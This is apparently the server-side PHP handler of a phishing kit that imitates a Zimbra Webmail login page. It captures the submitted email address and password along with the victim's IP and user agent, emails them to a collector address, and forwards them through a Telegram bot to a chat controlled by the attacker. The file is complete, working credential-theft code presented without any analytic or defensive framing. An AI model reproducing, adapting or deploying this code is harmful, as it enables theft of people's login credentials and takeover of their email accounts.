<?php
require_once 'email.php';
require_once 'telegram.php';

// Input validation and sanitization
$email = filter_input(INPUT_POST, 'di', FILTER_SANITIZE_EMAIL);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Function to send JSON response to the frontend
function sendJsonResponse($success, $message = '', $redirectUrl = '') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'redirectUrl' => $redirectUrl
    ]);
    exit();
}

// Debugging log to check if POST data is received
if (empty($email) || empty($password)) {
    error_log("Invalid input: email or password is missing.");
    sendJsonResponse(false, "Invalid input: Email or Password missing.");
    exit();
}

try {
    // Debug logs for backend processing
    error_log("Received email: {$email}");
    error_log("Received password: {$password}");

    // Get client information
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $hostname = gethostbyaddr($ip) ?: 'Unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

    // Build message using heredoc for better readability
    $message = <<<EOT
|-----------|Zimbra Webmail|------------|
Email: {$email}
Password: {$password}
|-----------------------|
Client IP: {$ip}
GeoIP: http://www.geoiptool.com/?IP={$ip}
User Agent: {$userAgent}
|-----------------------|
EOT;

    // Email Configuration (from email.php)
    error_log("Using Receiver email: {$Receive_email}");
    $subject = "Login Attempt: {$ip}";

    // Ensure mail() execution
    if (!mail($Receive_email, $subject, $message)) {
        error_log("Failed to send email to {$Receive_email}");
        sendJsonResponse(false, "Failed to send email.");
        exit();
    }

    // Telegram Notification
    $encodedMessage = urlencode($message);
    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendmessage?chat_id={$id}&text={$encodedMessage}";
    
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $telegramUrl,
        CURLOPT_SSL_VERIFYPEER => false, // Disable SSL verification
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10 // Prevent hanging
    ]);

    $result = curl_exec($curl);
    if (!$result || curl_errno($curl)) {
        error_log("Telegram API error: " . curl_error($curl));
        curl_close($curl);
        sendJsonResponse(false, "Failed to send Telegram notification.");
        exit();
    }

    curl_close($curl);

    // Respond to the frontend
    sendJsonResponse(true, "Notification sent successfully!", $redirect);
} catch (Exception $e) {
    error_log("Exception occurred: " . $e->getMessage());
    sendJsonResponse(false, "An error occurred. Please try again.");
}
?>
